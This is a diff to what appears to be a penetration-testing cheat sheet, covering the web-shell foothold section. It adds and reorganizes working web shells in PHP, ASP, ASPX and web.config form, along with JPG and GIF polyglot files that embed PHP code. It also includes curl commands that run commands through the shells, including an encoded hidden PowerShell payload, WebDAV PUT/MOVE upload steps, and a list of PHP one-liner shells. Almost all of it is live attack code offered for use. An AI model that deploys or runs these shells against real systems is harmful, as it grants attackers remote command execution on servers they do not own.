@@ -158,31 +158,34 @@ cd /mnt/c/hashcat; hashcat.exe -m 19700 hashes $(wslpath -w $rockyou)
 # Foothold: Protocols and Services
 ## Web
 [*] Web Shell
-[###] Create
--->> PHP
-echo -n '<?=`$_GET[cmd]`?>' | tee x.php
+[###] PHP
+echo -n '<?=`$_GET[cmd]`?>' | tee /Upload/shells/x.php
 
--->> ASP
-echo -n '<% Response.ContentType = "text/plain"\nSet s = CreateObject("WScript.Shell")\nSet c = s.Exec("cmd /c " & Request("cmd"))\nResponse.Write c.StdOut.ReadAll() %>' | tee x.asp
+[###] ASP
+echo -n '<% Response.ContentType = "text/plain"\nSet s = CreateObject("WScript.Shell")\nSet c = s.Exec("cmd /c " & Request("cmd"))\nResponse.Write c.StdOut.ReadAll() %>' | tee /Upload/shells/x.asp
 
--->> ASPX
-echo '<%@ Page Language="C#" Debug="true" Trace="false" %><%@ Import Namespace="System.Diagnostics" %><%@ Import Namespace="System.IO" %><script Language="c#" runat="server">void Page_Load(object sender, EventArgs e){if(Request.QueryString["cmd"]!=null){Response.ContentType="text/plain";Response.Write(Server.HtmlEncode(ExcuteCmd(Request.QueryString["cmd"])));Response.End();}}string ExcuteCmd(string arg){ProcessStartInfo ps=new ProcessStartInfo();ps.FileName="cmd.exe";ps.Arguments="/c "+arg;ps.RedirectStandardOutput=true;ps.UseShellExecute=false;Process p=Process.Start(ps);StreamReader stmrdr=p.StandardOutput;string s=stmrdr.ReadToEnd();stmrdr.Close();return s;}</script><HTML><body><form id="cmd" runat="server" onsubmit="return false;"><asp:TextBox id="i" runat="server"></asp:TextBox></form><pre id="r"></pre><script>document.getElementById("i").addEventListener("keydown",function(e){if(e.key==="Enter"){e.preventDefault();var v=this.value;fetch("?cmd="+encodeURIComponent(v)).then(r=>r.text()).then(t=>{document.getElementById("r").innerText=t;});}});</script></body></HTML>' | tee x.aspx
+[###] ASPX
+echo '<%@ Page Language="C#" Debug="true" Trace="false" %><%@ Import Namespace="System.Diagnostics" %><%@ Import Namespace="System.IO" %><script Language="c#" runat="server">void Page_Load(object sender, EventArgs e){if(Request.QueryString["cmd"]!=null){Response.ContentType="text/plain";Response.Write(Server.HtmlEncode(ExcuteCmd(Request.QueryString["cmd"])));Response.End();}}string ExcuteCmd(string arg){ProcessStartInfo ps=new ProcessStartInfo();ps.FileName="cmd.exe";ps.Arguments="/c "+arg;ps.RedirectStandardOutput=true;ps.UseShellExecute=false;Process p=Process.Start(ps);StreamReader stmrdr=p.StandardOutput;string s=stmrdr.ReadToEnd();stmrdr.Close();return s;}</script><HTML><body><form id="cmd" runat="server" onsubmit="return false;"><asp:TextBox id="i" runat="server"></asp:TextBox></form><pre id="r"></pre><script>document.getElementById("i").addEventListener("keydown",function(e){if(e.key==="Enter"){e.preventDefault();var v=this.value;fetch("?cmd="+encodeURIComponent(v)).then(r=>r.text()).then(t=>{document.getElementById("r").innerText=t;});}});</script></body></HTML>' | tee /Upload/shells/x.aspx
 
--->> XML / ASP (web.config)
+[###] JPG
+printf "\xff\xd8\xff\xe0<?php system('id'); ?>" | tee /Upload/shells/x.jpg
+exiftool -Comment='<?php system('id'); ?>' /Upload/shells/x.jpg
+
+[###] GIF
+printf "GIF89a;<?php system('id'); ?>" | tee /Upload/shells/x.gif
+
+[###] XML / ASP (web.config)
 echo -e '<?xml version="1.0" encoding="UTF-8"?>\n<configuration>\n<system.webServer>\n<handlers accessPolicy="Read, Script, Write">\n<add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\\system32\\inetsrv\\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />\n</handlers>\n<security>\n<requestFiltering>\n<fileExtensions>\n<remove fileExtension=".config" />\n</fileExtensions>\n<hiddenSegments>\n<remove segment="web.config" />\n</hiddenSegments>\n</requestFiltering>\n</security>\n</system.webServer>\n</configuration>\n<% Response.ContentType = "text/plain"\nSet s = CreateObject("WScript.Shell")\nSet c = s.Exec("cmd /c " & Request("cmd"))\nResponse.Write c.StdOut.ReadAll() %>' | tee web.config
 
-[###] Execute
--->> PHP and ASP
-curl -G 'http://$TARGET/x.php' --path-as-is --data-urlencode 'cmd=whoami /priv'
-curl -G 'http://$TARGET/x.php' --path-as-is --data-urlencode 'cmd=powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQB...<METASPLOIT>...'
+[###] Curl: Execute Commands
+curl -G --path-as-is 'http://$TARGET/x.php' --data-urlencode 'cmd=whoami /priv'
+curl -G --path-as-is 'http://$TARGET/x.php' --data-urlencode 'cmd=powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQB...<METASPLOIT>...'
 
--->> ASPX
+[###] Curl: PUT / MOVE
 curl -X PUT -d @x.aspx http://$TARGET/x.txt
 curl -X MOVE http://$TARGET/x.txt -H 'Destination:http://$TARGET/x.aspx'
-curl -G --path-as-is 'http://$TARGET/x.aspx' --data-urlencode 'cmd=whoami /priv'
 
-[###] Variations
--->> PHP
+[###] Variations: PHP
 <?=`$_GET[cmd]`?>
 <?php system($_GET['cmd']); ?>
 <?php passthru($_GET['cmd']); ?>
@@ -191,7 +194,7 @@ curl -G --path-as-is 'http://$TARGET/x.aspx' --data-urlencode 'cmd=whoami /priv'
 <?php echo passthru($_GET['cmd']); ?>
 <?php echo shell_exec($_GET['cmd']); ?>
 
--->> PHP Interactive
+[###] PHP Interactive
 <html>
 <body style="background: black;color: whitesmoke;font-family: 'Fira Code', 'Consolas', 'Liberation Mono', 'Courier New', monospace;font-size: 15px;margin: 10px 0 0 18px;">
 <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
